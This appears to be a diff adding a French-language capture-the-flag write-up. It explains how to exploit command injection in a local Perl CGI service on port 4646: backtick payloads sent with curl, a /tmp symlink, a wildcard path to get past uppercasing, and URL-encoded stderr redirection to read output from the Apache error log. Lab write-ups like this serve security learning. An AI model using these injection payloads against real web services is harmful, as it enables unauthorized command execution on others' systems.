@@ -1,0 +1,40 @@
+on trouve un fichier perl qui host sur localhost a travers le port 4646
+
+ps aux | grep perl => il est deja executer
+
+la vulnerabilite est sur le egrep qui va permettre d'executer une commande 
+
+http://localhost:4646?xx=test;getflag execute la commande getflag mais pas avec les droits de flag12
+
+si on cree une variable global est qu'on l'envoie dans le curl
+export CMD=getflag
+http://localhost:4646?xx=test;$CMD  --> ne marche pas
+
+si on link l executable getflag au fichier /tmp/xd 
+ln -s /bin/getflag /tmp/xd 
+curl http://localhost:4646?xx=test;/tmp/xd  --> ne marche pas
+
+pour regarder les retour d'erreur du serveur: "tail /var/log/apache2/error.log"
+
+tout d abord le programme perl transform les arguments en majuscule et trunc si ya un espace donc si on ecrit 
+getflag il va se transformer en GETFLAG qui n existe pas 
+il faut donc creer un lien entre le getflag d'origin et un fichier GETFLAG
+ln -s /bin/getflag /tmp/GETFLAG
+
+/!\ (/tmp/GETFLAG va devenir /TMP/GETFLAG --> n existe pas)
+donc pour appeler notre fichier il faut utiliser les wildcare /*/GETFLAG (va charcher dans /tmp/ le fichier GETFLAG qui est link au getfag d origin)
+
+curl 'http://localhost:4646?x=`/*/GETFLAG>/*/RES`'
+
+si on essaye de rediriger dans un fichier on a une erreur : "cannot create /*/RES: Directory nonexistent"
+si on redirige sur un stdout donc notre argument : curl 'http://localhost:4646?x=`/*/GETFLAG>&1`'
+probleme c'est un url donc il va comprendre le & comme un autre argument pour notre url et donc pas ecrire le resultat pour qu'on puisse y acceder
+
+CORECTION il faut rediriger sur le stderror pour avoir le resultat dans les logs error du serveur 'http://localhost:4646?x=`/*/GETFLAG>&2`'
+
+pour permettre la lecture du & comme un cararctere et nn pas comme un separateur il faut l encoder dans un format url => & = %26
+
+notre commande devient donc :
+curl 'http://localhost:4646?x=`/*/GETFLAG>%262`'
+
+et si on regarde dans les logs du serveur on peut recupere notre flag
